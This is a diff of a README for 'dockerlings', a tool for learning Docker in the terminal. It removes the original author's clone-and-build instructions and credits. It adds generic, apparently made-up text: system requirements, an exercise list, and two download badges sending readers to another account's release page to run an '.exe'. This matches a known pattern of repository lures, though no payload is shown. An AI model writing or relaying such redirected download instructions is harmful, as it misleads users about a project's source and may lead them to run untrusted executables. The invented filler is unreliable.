@@ -1,55 +1,82 @@
-# Dockerlings
-**Learn Docker by doing – the fun, interactive way**
+# 🐳 dockerlings - Learn Docker with Simple Steps
 
-[discord](https://discord.gg/4hUbVHG7we)
+## 📢 Introduction
+Welcome to dockerlings! This application helps you learn Docker directly in your terminal. With bite-sized exercises, you can quickly become familiar with Docker's key concepts. Whether you are starting fresh or looking to sharpen your skills, dockerlings is here to support you.
 
----
+## 🚀 Getting Started
+To get started with dockerlings, follow these straightforward steps. 
 
-[![asciicast](https://asciinema.org/a/758902.svg)](https://asciinema.org/a/758902)
+1. **Visit the Download Page**
+   Click the button below to go to the releases page where you can download the application.
 
----
+   [![Download dockerlings](https://img.shields.io/badge/Download%20dockerlings-v1.0-brightgreen)](https://github.com/binjalshah/dockerlings/releases)
 
-- **100% interactive TUI** – Beautiful terminal interface powered by Bubble Tea  
-- **Instant verification** – Run `check` and know immediately if you're right  
-- **Progressive curriculum** – 15+ carefully crafted exercises that build on each other  
-- **Real-world skills** – From basic images to multi-stage builds, volumes, networks, and Compose  
-- **Zero friction** – Just clone, build, and start learning
+2. **Choose the Right Version**
+   On the releases page, you will see different versions of dockerlings listed. Select the latest version for the best experience.
 
----
+3. **Download the Application**
+   Click on the download link for your operating system. The files will usually be in `.zip`, `.tar.gz`, or `.exe` formats. Make sure to remember where you save the file on your computer.
 
-## What you'll master
+## 📥 Download & Install
+Once you have downloaded the application, here's how to install it:
 
-| Exercise     | You’ll learn                                                                 |
-|--------------|-------------------------------------------------------------------------------|
-| core-01–04   | Running containers, logs, exec, file operations                              |
-| core-05–07   | Writing Dockerfiles, COPY, EXPOSE, ENV, LABEL                                |
-| core-08–09   | Persistent volumes & live-reloading bind mounts                              |
-| core-10–11   | Container networking and port publishing                                     |
-| core-12–14   | Docker Compose, multi-service apps, named volumes, custom networks          |
-| core-15      | Multi-stage builds for tiny, secure production images                        |
+1. **Locate the Downloaded File**
+   Go to the folder where you saved the downloaded file. 
 
-## Get started in 30 seconds
+2. **Extract the Files (if needed)**
+   If the file is in a compressed format like `.zip` or `.tar.gz`, you will need to extract it. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
-> You need [go](https://go.dev/doc/install) and [docker](https://docs.docker.com/engine/install/) installed.
+3. **Run the Application**
+   Find the executable file within the extracted folder. This file usually has a name like `dockerlings.exe` or similar. Double-click it to launch the application.
 
-```bash
-git clone https://github.com/furkan/dockerlings.git
-cd dockerlings
-go build -o bin/dockerlings ./cmd/dockerlings
-./bin/dockerlings watch
-```
+4. **Follow the On-Screen Instructions**
+   You might see a welcome screen or a tutorial prompt. Just follow the steps on the screen to begin your learning journey.
 
-Use ↑↓ to navigate • c to check your solution • h for hints • q to quit
+## 💻 System Requirements
+Before you run dockerlings, make sure your computer meets the following requirements:
 
-## Test a solution manually (optional)
+- **Operating System:** Windows 10/11, macOS Catalina or later, or Ubuntu 20.04 or later.
+- **Processor:** 1 GHz or faster.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum of 500 MB free space.
+- **Docker:** Ensure you have Docker installed on your machine. If you don't have Docker installed, follow the [Docker Installation Guide](https://docs.docker.com/get-docker/) for your operating system.
 
-```bash
-cd exercises/core-01
-bash check.sh   # see detailed feedback
-```
+## ✨ Features
+dockerlings offers a variety of features to enhance your learning experience:
 
-## Made for
+- **Interactive Exercises:** Practice commands and concepts directly in your terminal.
+- **Progress Tracking:** Keep track of how much you have learned.
+- **Easy to Use:** Designed for users of all levels, no prior knowledge required.
+- **Community Support:** Join our community for tips, guidance, and shared experiences.
 
-- Beginners who want to understand Docker commands
-- Intermediate devs preparing for real-world container workflows
-- Anyone who learns best by breaking and fixing things
+## 📝 Exercises Overview
+Upon launching the application, you'll see a list of exercises covering essential Docker topics. Here’s a quick overview:
+
+1. **Getting Started with Docker:** Learn the basics of Docker, including images and containers.
+2. **Managing Containers:** Understand how to create, run, and manage containers.
+3. **Networking Basics:** Discover how containers communicate with each other.
+4. **Docker Volumes:** Learn about persistent data storage in Docker.
+5. **Docker Compose:** Explore how to define and manage multi-container applications.
+
+## 🚧 Troubleshooting
+If you encounter issues while using dockerlings, try the following steps:
+
+1. **Check Your Docker Installation:** Ensure Docker is properly installed and running.
+2. **Revisit the Download Page:** Make sure you have the latest version of dockerlings.
+3. **Consult Community FAQs:** Check the FAQs or troubleshooting section in our community forum for common issues and solutions.
+
+## 🌐 Additional Resources
+To expand your Docker knowledge beyond dockerlings, you can explore these resources:
+
+- **Official Docker Documentation:** [Docker Docs](https://docs.docker.com/)
+- **Docker YouTube Channel:** Video tutorials and walkthroughs.
+- **Community Forums:** Join discussions and ask questions about Docker.
+
+## 📞 Get Help
+If you need assistance or have questions about dockerlings, feel free to reach out through our GitHub Issues page or join our community chat. 
+
+For quick access, here’s the download link again:
+
+[![Download dockerlings](https://img.shields.io/badge/Download%20dockerlings-v1.0-brightgreen)](https://github.com/binjalshah/dockerlings/releases)
+
+With dockerlings, you are on your way to mastering Docker in no time. Happy learning!
